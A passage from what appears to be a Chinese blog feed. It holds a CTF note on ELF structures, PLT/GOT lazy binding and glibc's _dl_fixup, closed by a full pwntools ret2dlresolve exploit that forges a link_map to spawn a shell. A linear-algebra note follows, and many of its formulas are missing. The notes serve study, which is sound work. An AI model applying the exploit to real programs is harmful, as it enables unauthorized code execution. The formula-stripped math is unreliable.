7


SHT_NOBITS: 不存在于文件中
8


SHT_REL : 重定位的一些信息
9


SHT_SHLIB
10


SHT_DYNSYM : 动态链接的符号表
11


SHT_INIT_ARRAY
14


SHT_FINI_ARRAY
15


SHT_PREINIT_ARRAY
16


SHT_GROUP
17


SHT_SYMTAB_SHNDX
18


SHT_LOOS
0x60000000


SHT_HIOS
0x6fffffff


SHT_LOPROC
0x70000000


SHT_HIPROC
0x7fffffff


SHT_LOUSER
0x80000000


SHT_HIUSER
0xffffffff




sh_flags：表示节的标志，用于描述节的特性和属性。标志的具体含义取决于节的类型和上下文。
sh_addr：表示节的虚拟地址，只在可执行文件中有意义。对于可执行文件，sh_addr 指定了节在内存中的加载地址，如果该节不可被加载，则该值为 0 。
sh_offset：表示节在文件中的偏移量，指定了节在文件中的位置。对于 bss 段来说该值没有意义。
sh_size：表示节的大小，指定了节所占据的字节数。
sh_link：表示链接到的其他节的索引，用于建立节之间的关联关系，具体含义依赖于节的类型。
sh_info：附加信息，具体含义依赖于节的类型。
sh_addralign：表示节的地址对齐要求，指定了节在内存中的对齐方式。即 sh_addr 需要满足 sh_addrmod  2sh_addralign=0sh_addrmod2sh_addralign=0 。如果 sh_addralign 为 0 或 1 表示该段没有对齐要求。
sh_entsize：表示节中每个项的大小，如果该字段为 0 说明节中不包含固定大小的项。

ELF 中常见的节如下：

.text：代码段（Code Section），用于存储程序的可执行指令。
.rodata：只读数据段（Read-Only Data Section），用于存储只读的常量数据，例如字符串常量。
.data：数据段（Data Section），用于存储已初始化的全局变量和静态变量。
.bss：未初始化的数据段（Block Started by Symbol），用于存储未初始化的全局变量和静态变量。它不占用实际的文件空间，而是在运行时由系统自动初始化为零。
.symtab：符号表节（Symbol Table Section），用于存储程序的符号表信息，包括函数、变量和其他符号的名称、类型和地址等。
.strtab：字符串表节（String Table Section），用于存储字符串数据，如节名称、符号名称等。字符串表节被多个其他节引用，通过偏移量和索引来访问具体的字符串。
.rel.text 或 .rela.text：代码重定位节（Relocation Section），用于存储代码段中的重定位信息，以便在链接时修正代码中的符号引用。
.rel.data 或 .rela.data：数据重定位节（Relocation Section），用于存储数据段中的重定位信息，以便在链接时修正数据段中的符号引用。
.dynamic：动态节（Dynamic Section），用于存储程序的动态链接信息，包括动态链接器需要的重定位表、共享对象的名称、版本信息等。
.note：注释节（Note Section），用于存储与程序或库相关的注释或调试信息。

延迟绑定流程
plt与plt.sec
func@plt:jmp    [func@got.plt]     ; 第一次跳转，直接跳转到 GOT 中存储的地址push   offset             ; offset 为该函数在 GOT 中的索引，如果是第一次调用，GOT 中的地址指向下一条指令jmp    .plt[0]            ; 跳转到 PLT 的“调度程序”....plt[0]:push   QWORD PTR [rip+0x2fe2]         # push link_mapbnd jmp QWORD PTR [rip+0x2fe3]        # jmp _dl_runtime_resolvenop    DWORD PTR [rax]
func@plt.secendbr64bnd jmp QWORD PTR [rip+0x2f9d]        # &lt;func@got.plt&gt;nop    DWORD PTR [rax+rax*1+0x0]
pwndbg&gt; pltSection .plt 0x401020 - 0x401050:No symbols found in section .pltSection .plt.sec 0x401050 - 0x401070:0x401050: setbuf@plt0x401060: read@pltpwndbg&gt; x/32i 0x401020   0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008   0x401026:    bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010   0x40102d:    nop    DWORD PTR [rax]   0x401030:    endbr64   0x401034:    push   0x0   0x401039:    bnd jmp 0x401020   0x40103f:    nop   0x401040:    endbr64   0x401044:    push   0x1   0x401049:    bnd jmp 0x401020   0x40104f:    nop   0x401050 &lt;setbuf@plt&gt;:       endbr64   0x401054 &lt;setbuf@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2fbd]        # 0x404018 &lt;setbuf@got.plt&gt;   0x40105b &lt;setbuf@plt+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]=&gt; 0x401060 &lt;read@plt&gt;: endbr64   0x401064 &lt;read@plt+4&gt;:       bnd jmp QWORD PTR [rip+0x2fb5]        # 0x404020 &lt;read@got.plt&gt;   0x40106b &lt;read@plt+11&gt;:      nop    DWORD PTR [rax+rax*1+0x0]
got与got.plt
got.plt(_GLOBAL_OFFSET_TABLE_)     —▸ 0x403e20 (_DYNAMIC) ◂— 1(_GLOBAL_OFFSET_TABLE_+8)   —▸ 0x7ffff7ffe190(link_map) ◂— 0(_GLOBAL_OFFSET_TABLE_+16)  —▸ 0x7ffff7fe7bc0(_dl_runtime_resolve) ◂— endbr64
00:0000│     0x403ff0 —▸ 0x7d56930a2f90 (__libc_start_main) ◂— endbr64             # got01:0008│     0x403ff8 ◂— 002:0010│     0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1          # got.plt03:0018│     0x404008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7d56932a2190 ◂— 004:0020│     0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7d569328bbc0 ◂— endbr6405:0028│     0x404018 (setbuf@got[plt]) —▸ 0x7d569310aad0 (setbuf) ◂— endbr6406:0030│     0x404020 (read@got[plt]) —▸ 0x401040 ◂— endbr64
.symtab
注意：符号表除了静态链接外没有用，但是程序为了方便调试会保留符号表，我们可以通过 strip + 程序名 的方式将符号表去除，这就是为什么有的 pwn 题的附件没有函数和变量名而有的却有。
ELF 文件中的符号表往往是文件中的一个段，段名一般叫 .symtab 。符号表是一个 Elf*_Sym 结构（32 位 ELF 文件）的数组，每个 Elf*_Sym 结构对应一个符号。
/* Symbol table entry.  */    typedef struct  &#123;    Elf32_Word	st_name;		/* Symbol name (string tbl index) */    Elf32_Addr	st_value;		/* Symbol value */    Elf32_Word	st_size;		/* Symbol size */    unsigned char	st_info;		/* Symbol type and binding */    unsigned char	st_other;		/* Symbol visibility */    Elf32_Section	st_shndx;		/* Section index */  &#125; Elf32_Sym;

st_name：符号名称在字符串表中的偏移量。
st_value：符号的值，即符号的地址或偏移量。
如果该符号在目标文件中，如果是符号的定义并且该符号不是 COMMON 块类型的则 st_value 表示该符号在段中的偏移。
在目标文件中，如果符号是 COMMON 块类型的则 st_value 表示该符号的对齐属性。
在可执行文件中，st_value 表示符号的虚拟地址。
st_size：符号的大小，如果符号是一个函数，则表示函数的大小。如果该值为 0 表示符号的大小为 0 或未知。
st_info：该字段是一个字节，包含符号的类型和绑定信息。符号类型包括函数、数据、对象等，符号绑定包括局部符号、全局符号、弱符号等。该字段的高 4 位表示符号的类型，低 4 位表示符号的绑定信息。
st_other：保留字段，通常为 0 。
st_shndx：通常为符号所在节的索引。
如果符号是一个常量，该字段为 SHN_ABS（初始值不为 0 的全局变量） 或 SHN_COMMON（初始值为 0 的全局变量）。
如果该符号未定义但是在该文件中被引用到，说明该符号可能定义在其他目标文件中，则该字段为 SHN_UNDEF 。

.rel.text/.rel.data
重定位表是一个 Elf*_Rel 结构的数组，每个数组元素对应一个重定位入口。重定位表主要有.rel.text 或 .rela.text，即代码重定位节（Relocation Section）和 .rel.data 或 .rela.data：数据重定位节（Relocation Section）。
/* Relocation table entry without addend (in section of type SHT_REL).  */    typedef struct  &#123;    Elf32_Addr	r_offset;		/* Address */    Elf32_Word	r_info;			/* Relocation type and symbol index */  &#125; Elf32_Rel;

r_offset：需要进行重定位的位置的偏移量或地址。这个位置通常是指令中的某个操作数或数据的地址，需要在链接时进行修正，以便正确地引用目标符号。
对于可执行文件或共享库，r_offset 表示需要修改的位置在内存中的位置（用于动态链接）。
对于可重定位文件，r_offset 表示需要修改的位置相对于段起始位置的偏移（用于静态链接）。
r_info：低 8 位表示符号的重定位类型，重定位类型指定了进行何种类型的修正，例如绝对重定位、PC 相对重定位等。高 24 位表示该符号在符号表中的索引，用于解析重定位所引用的符号。

.strtab

ELF 文件中用到了很多字符串，比如段名、变量名等。因为字符串的长度往往是不定的，所以用固定的结构来表示它比较困难。一种很常见的做法是把字符串集中起来存放到一个表，然后使用字符串在表中的偏移来引用字符串。
通过这种方法，在ELF文件中引用字符串只须给出一个数字下标即可，不用考虑字符串长度的问题。一般字符串表在ELF文件中也以段的形式保存，常见的段名为“.strtab”或“.shstrtab”。这两个字符串表分别为字符串表（String Table）和段表字符串表（Section Header String Table）。顾名思义，字符串表用来保存普通的字符串，比如符号的名字；段表字符串表用来保存段表中用到的字符串，最常见的就是段名（sh_name ）。
注意，在字符串表中的每个字符串的开头和结尾都有一个 \x00 填充。例如： fake_dynstr = '\x00libc.so.6\x00_IO_stdin_used\x00stdin\x00strlen\x00read\x00stdout\x00setbuf\x00__libc_start_main\x00system\x00'

.dynamic
动态链接 ELF 中最重要的结构是 .dynamic 段，这个段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。.dynamic 段是由Elf*_Dyn 构成的结构体数组。
/* Dynamic section entry.  */    typedef struct  &#123;    Elf32_Sword	d_tag;			/* Dynamic entry type */    union      &#123;        Elf32_Word d_val;			/* Integer value */        Elf32_Addr d_ptr;			/* Address value */      &#125; d_un;  &#125; Elf32_Dyn;
Elf32_Dyn 结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。我们这里列举几个比较常见的类型值（这些值都是定义在 elf.h 里面的宏），

DT_SYMTAB：指定了符号表的地址，d_ptr 表示 .dynsym 的地址。
DT_STRTAB：指定了字符串表的地址，d_ptr 表示 .synstr 的地址。
DT_STRSZ：指定了字符串表的大小，d_val 表示大小。
DT_HASH：指定了符号哈希表的地址，用于加快符号查找的速度，d_ptr 表示 .hash 的地址。
DT_SONAME：指定了共享库的名称。
DT_RPATH：指定了库搜索路径（已废弃，不推荐使用）。
DT_INIT：指定了初始化函数的地址，动态链接器在加载可执行文件或共享库时会调用该函数。
DT_FINI：指定了终止函数的地址，动态链接器在程序结束时会调用该函数。
DT_NEEDED：指定了需要的共享库的名称。
DT_REL/DT_RELA：指定了重定位表的地址。

link_map_x86
struct link_map  &#123;    ElfW(Addr) l_addr;    /* Difference between the address in the ELF           file and the addresses in memory.  */    char *l_name;   /* Absolute file name object was found in.  */    ElfW(Dyn) *l_ld;    /* Dynamic section of the shared object.  */    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */    ...    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM              + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
link_map 是存储目标函数查询结果的一个结构体，我们主要关心 l_addr 和 l_info 两个成员即可。

l_addr：目标函数所在 lib 的基址。
l_info：Dyn 结构体指针，指向各种结构对应的 Dyn 。
l_info[DT_STRTAB]：即 l_info 数组第 5 项，指向 .dynstr 对应的 Dyn 。
l_info[DT_SYMTAB]：即 l_info 数组第 6 项，指向 Sym 对应的 Dyn 。
l_info[DT_JMPREL]：即 l_info 数组第 23 项，指向 Rel 对应的 Dyn 。

struct link_map &#123;    Elf32_Addr l_addr;    char *l_name;    Elf32_Dyn *l_ld;    struct link_map *l_next;    struct link_map *l_prev;    struct link_map *l_real;    Lmid_t l_ns;    struct libname_list *l_libname;    Elf32_Dyn *l_info[76];//l_info 里面包含的就是动态链接的各个表的信息    const Elf32_Phdr *l_phdr;    Elf32_Addr l_entry;    Elf32_Half l_phnum;    ... ...&#125;
dynamic 中的地址对应着 link_map 中l_info 相应的指针，可从link_map 取到dynamic 结构中.rel.plt .dynsym .dynstr对应的指针,为后来程序的执行提供各个节的基地址
_dl_runtime_resolve
typedef struct  &#123;    Elf64_Sxword	d_tag;			/* Dynamic entry type */    union      &#123;        Elf64_Xword d_val;		/* Integer value */        Elf64_Addr d_ptr;			/* Address value */      &#125; d_un;  &#125; Elf64_Dyn;typedef struct&#123;  Elf64_Word	st_name;		/* Symbol name (string tbl index) */  unsigned char	st_info;		/* Symbol type and binding */  unsigned char st_other;		/* Symbol visibility */  Elf64_Section	st_shndx;		/* Section index */  Elf64_Addr	st_value;		/* Symbol value */  Elf64_Xword	st_size;		/* Symbol size */&#125; Elf64_Sym;typedef struct&#123;  Elf64_Addr	r_offset;		/* Address */  Elf64_Xword	r_info;			/* Relocation type and symbol index */&#125; Elf64_Rel;typedef struct&#123;  Elf64_Addr	r_offset;		/* Address */  Elf64_Xword	r_info;			/* Relocation type and symbol index */  Elf64_Sxword	r_addend;		/* Addend */&#125; Elf64_Rela;#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))
_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) &#123;    // 获取符号表地址    # define D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)    const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);    // 获取字符串表地址    const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);    // 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。    #define reloc_offset reloc_arg * sizeof (PLTREL)    # define PLTREL  ElfW(Rel)    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);    // 获取函数对应的符号表结构地址    const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];    // 得到函数对应的got地址，即真实函数地址要填回的地址    void *const rel_addr = (void *) (l-&gt;l_addr + reloc-&gt;r_offset);    lookup_t result;    DL_FIXUP_VALUE_TYPE value;    // 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)  这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);    /* Look up the target symbol.  If the normal lookup rules are not       used don&#x27;t look in the global scope.  */    // ☆ 关键判断，决定目标函数地址的查找方法。☆    if (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;        const struct r_found_version *version = NULL;        if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123;            const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;            version = &amp;l-&gt;l_versions[ndx];            if (version-&gt;hash == 0)                version = NULL;        &#125;        /* We need to keep the scope around so do some locking.  This is       not necessary for objects which cannot be unloaded or when       we are not using any threads (yet).  */        int flags = DL_LOOKUP_ADD_DEPENDENCY;        if (!RTLD_SINGLE_THREAD_P) &#123;            THREAD_GSCOPE_SET_FLAG ();            flags |= DL_LOOKUP_GSCOPE_LOCK;        &#125;#ifdef RTLD_ENABLE_FOREIGN_CALL        RTLD_ENABLE_FOREIGN_CALL;#endif        // 查找目标函数地址        // result 为 libc 的 link_map ，其中有 libc 的基地址。        // sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                                     version, ELF_RTYPE_CLASS_PLT, flags, NULL);        /* We are done with the global scope.  */        if (!RTLD_SINGLE_THREAD_P)            THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL        RTLD_FINALIZE_FOREIGN_CALL;#endif        /* Currently result contains the base load address (or link map)       of the object that defines sym.  Now add in the symbol       offset.  */        // 基址 + 偏移算出目标函数地址 value        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : 0);    &#125; else &#123;        /* We already found the symbol.  The module (and therefore its load       address) is also known.  */        // 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);        result = l;    &#125;    /* And now perhaps the relocation addend.  */    value = elf_machine_plt_value(l, reloc, value);    if (sym != NULL        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));    /* Finally, fix up the plt itself.  */    if (__glibc_unlikely (GLRO(dl_bind_not)))        return value;    // 更新 got 表    return elf_machine_fixup_plt(l, result, reloc, rel_addr, value);&#125;
p = start()bss_addr = elf.bss()new_stack = bss_addr + 0x200  # 新栈起始地址read_plt = elf.plt[&#x27;read&#x27;] plt0 = 0x401020   pop_rdi_ret = 0x40115epop_rsi_ret = 0x401160resolve = 0x401026bss = 0x404080fake_link_map_addr = bss + 0x400binsh = fake_link_map_addr + 0x50offset = libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;] # 选择一个已解析的函数fake_link_map = p64(offset &amp; 0xffffffffffffffff) # 需要这样调整一下否则 p64() 会报错fake_link_map = fake_link_map.ljust(0x10, b&#x27;\x00&#x27;) + p64(0) + p64(elf.got[&#x27;read&#x27;] - 0x8)fake_link_map = fake_link_map.ljust(0x20, b&#x27;\x00&#x27;) + p64((bss - offset) &amp; 0xffffffffffffffff) + p32(7) + p32(0)  fake_link_map = fake_link_map.ljust(0x40, b&#x27;\x00&#x27;) + p64(0) + p64(fake_link_map_addr + 0x20)fake_link_map = fake_link_map.ljust(0x50, b&#x27;\x00&#x27;) + b&#x27;/bin/sh\x00&#x27;fake_link_map = fake_link_map.ljust(0x68, b&#x27;\x00&#x27;) + p64(bss) # l_info[5] -&gt; 可读写地址即可fake_link_map = fake_link_map.ljust(0x70, b&#x27;\x00&#x27;) + p64(fake_link_map_addr + 0x10) # l_info[6]fake_link_map = fake_link_map.ljust(0xf8, b&#x27;\x00&#x27;) + p64(fake_link_map_addr + 0x40) # l_info[23]# 此处 r_offset + l_addr 为可读写地址即可payload  = b&#x27;a&#x27;*0x78payload += p64(pop_rdi_ret) payload += p64(0) payload += p64(pop_rsi_ret) payload += p64(fake_link_map_addr) payload += p64(read_plt) payload += p64(pop_rdi_ret) payload += p64(binsh) payload += p64(resolve) payload += p64(fake_link_map_addr) payload += p64(0)p.send(payload.ljust(0x100, b&#x27;\x00&#x27;)) p.send(fake_link_map.ljust(0x100, b&#x27;\x00&#x27;))p.interactive()
]]></content>
      <categories>
        <category>Competiton</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>LinearAlgebraNote</title>
    <url>/2025/10/22/LinearAlgebraNote/</url>
    <content><![CDATA[LinearAlgebraNote
行列式的运算
定义

性质









一些特殊类型的行列式运算
类型总览：

箭型行列式
两三角型行列式
两条线型行列式
范德蒙德型行列式
Hessenberg型行列式
三对角型行列式
各行元素和相等型行列式
相邻两行对应元素相差K倍型行列式

一：箭型行列式
最常见最常用的行列式，特征很好辨识，必须掌握，请看下例：
空白处都为
Solution: 将第一列元素依次减去第i 列的
得：

所以：

同理 空白处都为 有 
二：两三角型行列式

特征为对角线上方元素均为a ,下方元素均为b


当 a = b 时可化为箭型行列式计算，当 a ≠ b 时采用拆行法计算，请看下面两例


Solution: 将第i，i = 2...n 行都减去第一行
得： 
即化成了箭型行列式，所以：



Solution: 采用拆行法，目的是为了降阶


将第 i, i = 1...n − 1 列都减去最后一列，得：

所以： 
再由行列式转置不变性得到：

联立(11)(12) ,得通式：


通过适当变换可以化为两三角型行列式的，描述不如大家自己看例子揣摩，也很容易理解的，请看下例


Solution: 将第一行乘上  ，第一列乘上  ，得：

即化成了两三角型行列式

一些每行上有公因子但是无法向上式那样在保持行列式不变得基础上能提出公因子的，采用升阶法，请看下例


Solution: 加边升阶，得：

再将第 i, i = 2...n + 1 都减去第一行的xi，i = 1...n 倍，得：

即又化成了箭型行列式，可得通式：

三：两条线型行列式
特征是除了主(次)对角线或与其相邻得一条斜线所组成的任意一条线加四个顶点中的某个顶点外，其他元素均为0，这类行列式可以直接展开降阶。这段描述有点繁琐，但其实也并不复杂，请看下例理解
空白处都为
Solution: 按照第一列两个非0元素拉普拉斯展开即可

四：范德蒙德型行列式
范德蒙德行列式大家应该熟悉，而范德蒙德型行列式的特征就是有逐行(列)元素按幂递增(减)，可以将其转化为范德蒙德行列式来计算，请看下例

Solution: 将每行都提出 ain, i = 1...n + 1倍，得：

上式即为范德蒙德行列式，所以通式为：

五：Hessenberg型行列式
特征为除了主(次)对角线及与其相邻的斜线，再加上第一行(列)或第n行(列)外，其余元素均为0。这类行列式有点像前面说的两条线型行列式，但是还是有一点区别的。这类行列式都用累加消点法，即通常将某一行(列)都化简到只有一个非0元素，以便于降阶计算，请看下例

Solution: 将各列都加到第一列，得到：

降阶之后再重复上述步骤即可得到通式：

注：需要说明的是，上面举的例子比较容易看出如何实施累加消点法就可以实现将某一行(列)都化简到只有一个非0元素从而达到降阶的目的，但是还有很多Hessenberg型行列式并不这么容易就做到，还需要大家找找技巧稍微变换一下，只要始终记得你要用累加消点法来消元来降阶就可以了
六：三对角型行列式
这是一种递推结构的行列式，特征为所有主子式都有相同的结构，从而以最后一列展开，将所得的(n − 1) 阶行列式再展开即得递推公式，即递推法(特征方程法)，请看下例

Solution: 按第一列拉普拉斯展开，得：

解特征方程： x2 = ax − bc ，得：


即可得通式：

注：特征方程法我没记错的话，应该是在高中将数列的时候用到的。
七：各行元素和相等型行列式
这个特征已经很清楚了吧，方法就是累加法，很简单，直接看下例

Solution: 将第i, i = 2...n 行都加到第一行去，得：

所以：

八：相邻两行对应元素相差K倍型行列式
这个要用步步差法
(1)大部分元素为数字，且相邻两行对应元素相差为1，采用逐步作差的方法，即可出现大量  ± 1 元素，进而出现大量0元素
(2)若相邻两行相差K倍，采用逐步作k倍差得方法，即可出现大量0元素
请看下面两个例子

Solution: 从第一行开始，依次用前一行减去后一行，得：

再将第一列加到第i, i = 2...n 列，得：



Solution: 从第一行开始，依次用前一行加上后一行的( − a) 倍，得：

所以：

矩阵的运算
加法



数乘





乘法











特别地，只有A,B可交换时，有 

转置

对称矩阵：
反称矩阵：




共轭





迹





行列式




逆矩阵






伴随矩阵











初等变换






可逆方阵







行变换左乘，列变换右乘
初等行变换
初等行变换
初等列变换
分块矩阵















相似矩阵
对于矩阵，若存在可逆矩阵使则称相似于，记作 




正交矩阵
若阶方阵满足即则称为正交矩阵
性质1：为正交矩阵的充要条件是是一组标准正交基，即
性质2：
性质3：若为正交矩阵，则也是正交矩阵，且
性质4：若为正交矩阵，则也是正交矩阵
性质5：若都为正交矩阵，则也是正交矩阵
正交矩阵的任意不同两行（列）对应元素乘积为0，同一行（列）元素平方和为1，正交矩阵的行（列）所构成的向量组为标准正交向量组
对角矩阵
可对角化
定理1：阶矩阵可对角化的充要条件是有个线性无关的特征向量
忽略特征值的排列顺序，则得到对角矩阵是唯一的，称其为相似标准型
定理2：矩阵的对应于不同特征值的特征向量是线性无关的
定理3：设是方阵的个互不相同的特征值，对应于的线性无关的特征向量为，则有所有这些特征向量构成的向量组是线性无关的（共个）
定理4：阶矩阵可对角化的充要条件是的每个重特征值的代数重数等于其几何重数
实对称矩阵
定理1：实对称矩阵的特征值都是实数
定理2：实对称矩阵对应于不同特征值的特征向量是正交的

（1）关注是否要正交
（2）只需对重特征值对应的特征向量进行正交化
（3）特征值与特征向量排列顺序要一致
（4）正交化过程是可以避免的
（5）正交矩阵并不是唯一的

有几类常见题型


已知求，可以使用对角化，有些也可以写成列向量左乘行向量，便可以使用结合律使用行向量左乘列向量
已知带参数的矩阵和它的对角矩阵求完整矩阵，使用特征值之和和之积解方程组
已知对角矩阵和对应特征向量求原矩阵
已知对角矩阵和一些特征向量求原对称矩阵，可以使用正交性质解出一组解，转换为3
已知有重特征值的对角矩阵和非重特征值对应的特征向量求原对称矩阵，可以使用正交性质解出正交基础解系再单位化，转化为3


共轭矩阵







合同
设和是阶矩阵，若有可逆矩阵使，则称矩阵与合同，记作
定理1：二次型经过可逆线性变换后，此时与合同
二次型的矩阵

其中，被称为二次型的矩阵
对于  对应的二次型的矩阵  若，使可逆矩阵，则称为满秩线性变换（可逆线性变换），否则称为降秩线性变换
标准形化
配方法
配方法得到的线性变换矩阵的行列式不能等于0
向量
线性相关
称为线性组合：  称能被α1, α2, ..., αn线性表示：

存在不全为零使等式成立则为线性相关，否则线性无关

注意：只含一个0向量时线性相关，只包含一个非零向量时线性无关
性质1：向量组若有部分向量构成的向量组线性相关，则全体向量组线性相关
推论1：向量组若全体向量组线性无关，则任意部分向量组线性无关
性质2：若向量组含零向量，则向量组一定线性相关
定理1：m个向量线性相关的充要条件是向量组中至少有一个向量可以由其余m-1个向量线性表示
推论1：m个向量线性无关的充要条件是向量组中全部向量都不能由其余m-1个向量线性表示
定理2： 线性无关， ，线性相关，则能由 线性表示，且表达式唯一
推论1：两个向量组，若r+1维向量组线性相关，则r维向量组线性相关
定理3：n维向量组αi = (a1i, a2i, ..., ani)T, i = 1, 2, ..., m线性相关的充要条件是有非零解（即行列式为0），且一个非零解就是线性表示的一组系数
定理4：n维向量组线性无关的充要条件是只有零解（即行列式不为0）
定理5：任意n+1个n维向量线性相关

线性运算
和向量


数乘


性质








线性空间(前)
定义
1
设V是数域F上的所有n维向量构成的集合，且对于向量的线性封闭运算 

称集合V为数域F上的n维向量空间，记为
2
设V是数域F上的n维向量构成的非空集合，且对于向量的线性封闭运算 

称集合V为数域F上的向量空间，也称为V是的子空间
3 子空间
设有向量空间，如果，那么称是的子空间
两个特殊的子空间称为平凡子空间
4 基
设V为数域F上的向量空间，若V中的r个向量满足

线性无关
V中任意一个向量都可由线性表示

则称向量组是向量空间V的一个基，r为向量空间的维数，记作

只有零向量的向量空间没有基，其维数为0
向量空间的基不唯一
向量空间V又称由基所生成的向量空间，记作

性质

在n维向量空间中，任何一组线性无关向量最多只能包含n个向量
在中的n个向量线性无关，则Fn中任何一组线性无关的向量最多只能包含n个向量
称在基下的坐标为A

初等行变换
秩
定义
等价
两个向量组，若一个向量组A的任一向量都可以由向量组B中的向量线性表示，则称向量组A可以由向量组B线性表示，若向量组A和向量组B可以相互线性表示，则称向量组A与向量组B等价，记为
若矩阵满足，则称矩阵的列向量组能由矩阵的列向量组线性表示，为这一线性表示的系数矩阵，而矩阵的行向量组能由的行向量组线性表示，为这一线性表示的系数矩阵
极大线性无关组
设有向量组，若一个部分组满足

线性无关
任意均可由线性表示

则称为的一个极大线性无关组，简称极大无关组

只有零向量的向量组没有极大无关组
极大无关组不一定唯一
一个线性无关的向量组的极大无关组就是它本身

向量组的秩
向量组的极大无关组中所含向量个数称为向量组的秩，记作，简记为
矩阵的秩

矩阵的行（列）向量组的秩称为行（列）秩
矩阵的行秩和列秩统称为秩，记作，简记为

性质
向量组的等价

自反性、对称性、传递性
若线性无关的向量组可以由向量组Bt线性表示，则
若线性无关的向量组可以由向量组Bt等价，则
若线性无关的向量组可以由向量组Bt线性表示，且，则向量组A线性相关

极大线性无关组

向量组与它的任意一个极大无关组等价
向量组的任意两个极大无关组等价，且所含向量个数相同

向量组的秩

如果向量组A可以由向量组B线性表示，则
两个向量组等价，则秩相等
若两个向量组秩相同，并且其中一个向量组可以被另一个向量组线性表示，则这两个向量组等价
向量组线性无关当且仅当

矩阵的秩

任何矩阵的行秩等于列秩等于非零子式的最高阶数
矩阵的初等变换不改变矩阵的秩

矩阵的初等行（列）变换不改变矩阵的行（列）秩
矩阵的初等行（列）变换不改变矩阵的列（行）秩

矩阵的转置不改变矩阵的秩
若初等行变换，则两个向量组有相同的线性关系
存在可逆使，r为矩阵A的行秩






n价矩阵A的秩等于n的充要条件是A为可逆矩阵
等价矩阵有相同的秩
的充要条件是A的非零子式的最高阶数为r

n阶方阵A可逆等价于A的行（列）向量线性无关
n阶方阵A的行列式为0等价于A的行（列）向量线性相关等价于


若初等行变换，则
特征向量
设是阶矩阵，若存在数和维非零向量，使得  则称为矩阵的特征值，称为矩阵的对应于特征值的一个特征向量

1.特征向量是非零向量
2.对应于同一特征值的特征向量不唯一

求解

解，得到特征值
对于每一个特征值，求解方程组的所有非零解，即的对应于特征值的全部特征向量

性质
定义1：在特征值对应的全部特征向量中，设有极大无关组，这个极大无关组所张成的空间称为矩阵关于特征值的特征子空间，记作，这个特征子空间的维数称为特征值的几何重数  定义2：设是阶矩阵的重特征值，则称为特征值λ0的代数重数
定理1： l ≤ k 定理2：若和都是矩阵的对应于特征值的特征向量，则也是的对应于的特征向量
定理3：一个特征向量不能对应于不同的特征值
定理4：设是阶矩阵的全部特征值，则  定理5：若是矩阵的特征值，是的对应于的特征向量，则

是的特征值
是的特征值
当可逆时，是的特征值
当可逆时，是的特征值
是的特征值
矩阵和矩阵的特征值相同
相似矩阵的特征多项式相同，特征值也相同

解线性方程组

等价：第一个方程组的每一个解都是第二个方程组的解，第二个方程组的每一个解都是第一个方程组的解
相容：线性方程组有一个解或有无穷个解，无解则称不相容

一般线性方程组有解判别定理
对于已消元的阶梯形矩阵 

当时线性方程组无解
当且时线性方程组有唯一解
当且时线性方程组有无穷多个解

齐次线性方程组
设是矩阵关于齐次线性方程组，下列命题等价

有非零解
的列向量组线性相关

|A| = 0

设是矩阵关于齐次线性方程组，下列命题等价

只有零解
的列向量组线性无关

|A| ≠ 0

基础解系：设是的解向量若满足以下条件，则称是的一个基础解系

线性无关
的任意一个解向量都可由线性表示

定理1：设是矩阵，若则齐次线性方程组存在基础解系且基础解系含个解向量
对于行最简形矩阵  其通解可以表示为  其中 
非齐次线性方程组
设是矩阵关于非齐次线性方程组，下列命题等价

有解
b可由的列向量组线性表示


其通解可以表示为  其中为方程的一个特解  其中为对应齐次线性方程组的通解
线性空间与线性变换
